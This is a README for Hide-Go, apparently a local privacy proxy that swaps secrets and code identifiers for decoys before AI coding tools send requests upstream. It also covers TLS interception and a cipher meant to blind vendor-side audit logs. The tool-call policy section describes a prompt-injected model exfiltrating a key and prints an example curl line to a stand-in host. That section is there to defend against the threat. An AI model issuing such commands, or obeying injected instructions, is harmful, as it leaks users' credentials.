<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="assets/logo-dark.png" />
  <img src="assets/logo.png" alt="HG Icon" width="84" />
</picture>
<br />
<picture>
  <source media="(prefers-color-scheme: dark)" srcset="assets/logo-wordmark-dark.png" />
  <img src="assets/logo-wordmark.png" alt="Hide-Go" width="280" />
</picture>

<p><b>Local privacy firewall and reversible payload cloak for AI coding harnesses</b></p>

[![Rust](https://img.shields.io/badge/Rust-1.80%2B-orange?logo=rust)](https://www.rust-lang.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)](#downloads)
[![Release](https://img.shields.io/github/v/release/Aflydream/hide-go?color=10b981)](https://github.com/Aflydream/hide-go/releases)
[![License](https://img.shields.io/badge/License-MIT-slate)](LICENSE)

**English** | [简体中文](./README_CN.md)

[Downloads](#downloads) · [How It Works](#three-interception-modes) · [Supported Harnesses](#supported-harnesses) · [Build from Source](#build-from-source)

</div>

---

If you run `tcpdump` or a local proxy while coding with Claude Code, Cursor, or Codex, the outbound traffic is eye-opening. You ask the model to fix a one-line type error, and the client quietly ships your `.env` values, Git remotes, internal database IPs, and directory trees to upstream endpoints like `/api/event_logging` or background `repo-indexing` workers.

**Hide-Go** sits on `127.0.0.1:18787` between your local coding tools and cloud LLM providers. It compiles into a single ~8MB Rust binary (Windows, macOS, and Linux) with the desktop UI embedded directly inside the executable. Before a request leaves your machine, Hide-Go swaps real secrets and proprietary code identifiers for format-preserving decoys or cover-domain code. When the upstream SSE stream comes back, a sliding-window restorer swaps your real names back in on the fly.

```mermaid
flowchart LR
    A["💻 Local Harness\n(Claude Code / Cursor / etc.)"] -->|"1. Raw prompt + real secrets & code"| B["🛡️ Hide-Go Local Proxy\n(127.0.0.1:18787)"]
    B -->|"2. Semantic placeholders / Botanical cover code / Braille cipher"| C["☁️ Upstream LLM Provider"]
    C -->|"3. SSE stream (reasoned over cover tokens)"| B
    B -->|"4. Sliding-window real-time restoration"| A
```

---

## Three interception modes

You can switch modes anytime from the top bar of the desktop window without restarting your IDE or CLI:

| Mode | When to use it | What leaves your editor | What the provider sees |
| :--- | :--- | :--- | :--- |
| **1. Audit Only** | See what your tools are uploading behind your back | Untouched payload | Untouched payload, while the local UI highlights leaked paths, keys, and telemetry calls |
| **2. Auto Desensitize** | Daily coding when you want secrets and internal network topology stripped | Real DB URLs, API keys, private IPs, file paths | **Format-valid fake tokens** (`198.18.0.1`, `sk-sem-placeholder-key-0001`), restored locally on stream return |
| **3. All-Hide** | Core algorithms or sensitive repos where even business domain names shouldn't leak | Proprietary trading, risk, or internal business logic | **Botanical garden cover code**, **Braille high-entropy cipher**, or **Chaff decoy files** |

### Side-by-side: what stays local vs. what hits the cloud

Suppose you ask an agent to check a liquidation function for reentrancy bugs with **All-Hide (Isomorphic Camouflage)** turned on:

<table>
<tr>
<th width="50%">🔴 Local code in your editor (never leaves your machine)</th>
<th width="50%">🟢 What the LLM vendor actually receives</th>
</tr>
<tr>
<td>

```rust
// ProjectTitan HFT settlement module
// Path: /home/alice/ProjectTitan/src/pay.rs
pub fn verify_margin_liquidation(
    wallet_secret: &str,
) -> bool {
    let db = "postgres://admin:RealPass99@10.18.44.12:5432/prod";
    let key = "sk-ant-api03-secret9988776655";
    calculate_liquidation_ratio(wallet_secret, db, key)
}
```

</td>
<td>

```rust
// GreenhouseApp_01 HFT settlement module
// Path: /workspace/user_01/GreenhouseApp_01/src/pay.rs
pub fn compost_magnolia_766(
    nectar_foliage_130: &str,
) -> bool {
    let db = "postgres://db_user_01:db_pass_placeholder_01@db-01.example.internal:5432/app_schema_01";
    let key = "sk-sem-placeholder-key-0001";
    chlorophyll_bamboo_186(nectar_foliage_130, db, key)
}
```

</td>
</tr>
</table>

> The right-hand column is the gateway's real output, captured from a local run and not edited. Cover names are hashed from the project salt, which is generated randomly on each install, so the names on your machine will differ. `ProjectTitan` is replaced because the default configuration ships with a sample custom rule for it.

> **Why can the model still write working code?**
> Language keywords (`pub`, `fn`, `let`, `bool`), types, and call graphs stay intact. The model analyzes the control flow of `compost_magnolia_766` and streams back its fix. Hide-Go translates it back to `verify_margin_liquidation` before your harness ever renders the diff: SSE streams go through `SseRestorer`, which reassembles tokens split across chunk boundaries, and plain JSON responses go through `restore`. Both paths produce the same result.

---

## Inside All-Hide: four independent switches

You can mix and match these four sub-modes inside the All-Hide configuration panel:

* 🔤 **Strict Literal Masking** (on by default): Replaces quoted string literals in code with placeholders of the form `<<HIDE_STR_001>>` and restores them on the way back. Natural-language prompts are left alone.
* 🌱 **Isomorphic Camouflage** (on by default): Hashes compound identifiers (snake_case, camelCase, PascalCase) and trailing `//` comments with a project salt into one of three built-in cover vocabularies (`Botanical Garden`, `Library Catalog`, or `Bakery Recipe`). Plain English words and prose keep their meaning, and tool definitions, call IDs and request structure are never rewritten, so the request is always a valid API call.
* ⠿ **Cipher Garble** (off by default): Encrypts payload blocks into high-entropy Braille streams (`⟦HIDE-CIPHER::⠷⠩⡬⡺⢵⣑⡬...⟧`) so plaintext audit logs and regex scrapers on the vendor side only see gibberish. The cost is that **the model cannot read the content either**, so this only suits data that has to be echoed back verbatim rather than understood.
* 🎭 **Telemetry & Indexing Chaff** (on by default): Telemetry requests never leave your machine; the gateway answers them locally with a success response. Background code-indexing uploads keep their JSON shape and roughly their size, with every content string swapped for decoy code. Telemetry is recognised by **request path only**, so inference endpoints such as `/v1/messages` and `/chat/completions` are never intercepted.

---

## Supported harnesses

Hide-Go scans your machine for installed AI coding tools (`PATH` binaries, standard install directories, and config files), shows live traffic counts per harness, and provides **reversible one-click integration** (serving both reverse-proxy routes and selective `HTTPS CONNECT` MITM on a single port, with lossless config backups and one-click rollback):

| Tool | Local Proxy Route | Auto-Connect Mode | What Hide-Go watches for |
| :--- | :--- | :--- | :--- |
| **Claude Code** | `http://127.0.0.1:18787/claude-code` | `~/.claude/settings.json` (chains existing upstream proxies) | `CLAUDE.md` context injection, `Read`/`Bash` tool outputs, `/api/event_logging` telemetry |
| **OpenAI Codex** | `/codex` + selective HTTPS MITM | `~/.codex/config.toml` + managed env script (`OPENAI_BASE_URL`, `HTTPS_PROXY`, `CODEX_CA_CERTIFICATE`) | Sandbox file trees, shell execution logs containing secrets |
| **Antigravity** | Selective HTTPS MITM (HTTP/2 enabled) | IDE `User/settings.json` + managed env script (`HTTPS_PROXY`, `NODE_EXTRA_CA_CERTS`) | Mounted workspace paths, cross-file context snippets (binary Proto RPC streams pass through untouched) |
| **ZCode** | Selective HTTPS MITM | Managed env script (`ZCODE_HTTP_PROXY`, `ZCODE_AGENT_CA_CERT`, `HTTPS_PROXY`) | Open buffer snapshots, completion context |
| **Qoder** | Selective HTTPS MITM | `Qoder` / `QoderCN` `User/settings.json` + managed env script | Background codebase vector indexing uploads |
| **Cursor** | Selective HTTPS MITM | `Cursor/User/settings.json` + managed env script (`http.proxy`, `http.proxySupport`) | Composer multi-file context, `repo-service` chunk uploads |
| **Grok Build** | `/grok-build` + selective HTTPS MITM | Managed env script (`GROK_XAI_API_BASE_URL`, `GROK_CLI_CHAT_PROXY_BASE_URL`, `HTTPS_PROXY`) | Build context bundles, internal hostnames in compiler logs |

<details>
<summary><b>📋 One-line environment setup (Bash / Zsh / PowerShell)</b></summary>

**Linux / macOS (Bash / Zsh)**
```bash
# Claude Code
export ANTHROPIC_BASE_URL="http://127.0.0.1:18787/claude-code"
export NO_PROXY="localhost,127.0.0.1,::1"

# OpenAI Codex
export OPENAI_BASE_URL="http://127.0.0.1:18787/codex/v1"
export HTTPS_PROXY="http://127.0.0.1:18787"
export NO_PROXY="localhost,127.0.0.1,::1"

# Grok Build
export GROK_XAI_API_BASE_URL="http://127.0.0.1:18787/grok-build/v1"
export HTTPS_PROXY="http://127.0.0.1:18787"
export NO_PROXY="localhost,127.0.0.1,::1"
```

**Windows (PowerShell)**
```powershell
$env:ANTHROPIC_BASE_URL = "http://127.0.0.1:18787/claude-code"
$env:OPENAI_BASE_URL    = "http://127.0.0.1:18787/codex/v1"
$env:HTTPS_PROXY        = "http://127.0.0.1:18787"
$env:NO_PROXY           = "localhost,127.0.0.1,::1"
```

</details>

> **Selective TLS inspection & compatibility guarantees**:
> * **AI hosts only, zero interference elsewhere**: `HTTPS_PROXY` / `CONNECT` traffic only performs TLS inspection for built-in or configured AI API hosts (such as `api.openai.com`, `api2.cursor.sh`, `*.qoder.sh`). OAuth/login origins and all general hosts (GitHub, npm, Cargo, etc.) are bridged as raw TCP passthrough without decryption. Both HTTP/1.1, HTTP/2, and WebSocket (`wss://`) upgrades inside MITM tunnels are supported.
> * **Explicit CA trust & liveness-guarded env scripts**: Managed `~/.hide-go/env.ps1` and shell RC blocks probe `127.0.0.1:<port>` before exporting proxy variables, so closing Hide-Go never breaks terminal networking. Root CA trust is installed only when explicitly triggered in the UI ("安装并信任根证书") and never silently modifies the Windows Registry.

## Secrets in tool calls are restored only for file writes by default

Tool calls issued by the model (shell commands, network requests, file writes) run on your machine. If real secrets were always restored inside those arguments, a prompt-injected model would only have to echo a placeholder, as in `curl https://x/?k=sk-sem-placeholder-key-0001`, to make your machine run the command with the real key. The default policy is therefore: **restore only inside the content fields of file writes and edits, and keep placeholders in command lines and URLs**. Use environment variables for commands that need a real key. You can switch to "always keep placeholders" or "restore everywhere" in the console under 保护策略 (Policy) → 工具调用中的凭据 (Secrets in tool calls); the console UI is currently Chinese-only. Placeholders in ordinary text replies are always restored, and non-secret data such as paths and internal addresses is not affected by this setting.

---

## Downloads

Grab the **Hide-Go Setup** archive for your platform from the [Releases page](https://github.com/Aflydream/hide-go/releases). Each archive ships a thin native `Hide-Go-Setup` launcher alongside shared runtime libraries (`hide_engine`, `hide_chrome`), external `resources/`, and a compressed `data/app.tar.gz` payload verified against `data/payload-manifest.json`. Extract the full archive so all files remain beside `Hide-Go-Setup` before running it:

* **Windows (x64)**: Download `Hide-Go-Setup-windows-x64.zip`, extract all files, and run `Hide-Go-Setup.exe`
* **macOS (Apple Silicon)**:
  ```bash
  tar -xzf Hide-Go-Setup-macos-arm64.tar.gz && ./Hide-Go-Setup-macos-arm64/Hide-Go-Setup
  ```
* **Linux (x86_64)**:
  ```bash
  tar -xzf Hide-Go-Setup-linux-x86_64.tar.gz && ./Hide-Go-Setup-linux-x86_64/Hide-Go-Setup
  ```

Silent CLI flags are also supported for automated provisioning or removal:

```bash
# Silent install and auto-connect detected harnesses
Hide-Go-Setup --silent --install --dir /path/to/Hide-Go --auto-connect

# Silent uninstall and roll back managed harness configs
Hide-Go-Setup --silent --uninstall --dir /path/to/Hide-Go
```

### Runtime configuration

Once installed, launch `hide-go-desktop` to start the proxy on `127.0.0.1:18787` and open the desktop console, or set `HIDE_GO_HEADLESS=1` (or run `hide-go-daemon`) for headless server mode:

| Environment variable | Effect |
| :--- | :--- |
| `HIDE_GO_PORT` | Listening port. Defaults to the value in the config file (`18787`) |
| `HIDE_GO_HEADLESS` | When set, no console window is opened |
| `HIDE_GO_CONFIG` | Config file path. Defaults to `%APPDATA%\hide-go\config.json` (Windows), `~/Library/Application Support/hide-go/config.json` (macOS), `~/.config/hide-go/config.json` (Linux) |
| `HIDE_GO_UPSTREAM_URL` | Sends every tool to a self-hosted or third-party compatible endpoint. A single request can override it with the `X-Hide-Go-Upstream` header |
| `HIDE_GO_ADMIN_TOKEN` | Pins the management API token. Without it a random token is generated on each start |

### Where your data lives

* The gateway listens on `127.0.0.1` only. Other devices on your network cannot reach it.
* The **mapping table** (placeholder ↔ real value) exists only in process memory and is gone when the process exits. It holds at most 50,000 entries and evicts the least recently used ones beyond that.
* **Traffic records** are also memory-only, limited to the most recent 200.
* The only thing written to disk is the config file: processing mode, custom rules and the project salt. The salt is generated randomly on first run.
* The management API requires a token and checks `Host`, `Origin` and `Sec-Fetch-Site` to stop DNS rebinding and cross-site requests. The token is never stored in a cookie.

---

## Build from source

Prerequisites: Rust `1.80+` and Node.js `20+` (only needed when rebuilding the embedded frontend bundle).

```bash
# 1. Run workspace unit & integration tests (engine, desktop, and setup installer)
cargo test --workspace

# 2. Build the frontend bundles (desktop console + setup wizard), shared libraries, and launchers
npm install && npm run build
cargo build --release -p hide-chrome -p hide-engine -p hide-go-desktop -p hide-daemon -p hide-setup

# 3. Assemble a local Setup package directory and archive (Linux example)
node scripts/package-setup.mjs --os linux --package-dir dist-pkg/Hide-Go-Setup-linux-x86_64 --archive dist-pkg/Hide-Go-Setup-linux-x86_64.tar.gz --format tar.gz
```

### Repository layout

```text
hide-go/
├── crates/hide-core/          # Core Rust privacy proxy, desensitizer, vault, and SSE restorer library
│   ├── src/
│   │   ├── scanner.rs         # Scanner for keys, DB URLs, private IPs, paths, and custom rules
│   │   ├── vault.rs           # Thread-safe bidirectional placeholder <-> raw value table, size-capped
│   │   ├── desensitizer.rs    # Format-preserving placeholder generator
│   │   ├── all_hide.rs        # Cover vocabularies, literal masking, Braille cipher, and chaff generator
│   │   ├── protocol.rs        # Wire-protocol fields that must stay byte-exact (IDs, enums, signed blocks, tool schemas)
│   │   ├── restore.rs         # JSON response restoration and the tool-call secret policy
│   │   ├── sse_restorer.rs    # Protocol-aware, per-channel SSE stream restorer
│   │   ├── stream_restorer.rs # Sliding-window text restorer across arbitrary chunk splits
│   │   ├── harness.rs         # Routing, profiles, and script generation for the 7 tools
│   │   ├── harness_detect.rs  # Local tool detection, reversible auto-connect, and config backups
│   │   └── proxy.rs           # Axum reverse proxy, management API, and offline simulator
│   └── tests/                 # Regression tests for the code-review findings
├── crates/hide-chrome/        # Shared WebView window & native OS helper dynamic library (cdylib)
├── crates/hide-engine/        # Shared engine dynamic library (cdylib): gateway, disk UI server, daemon, and installer
├── crates/hide-launcher/      # Thin C-ABI dynamic loader & crash dialog helper shared by launchers
├── crates/hide-daemon/        # Thin headless daemon launcher (hide-go-daemon)
├── crates/hide-setup/         # Thin Setup wizard & uninstaller launcher (hide-go-setup)
├── scripts/package-setup.mjs  # Assembles runtime DLLs, resources/, and data/app.tar.gz Setup archives
├── src/                       # Desktop console & Setup wizard UIs (React + Vite + Tailwind)
└── desktop/                   # Thin desktop console launcher (hide-go-desktop) with Win32 icon resource
```

---

## Community

- Forum: [linux.do](https://linux.do)
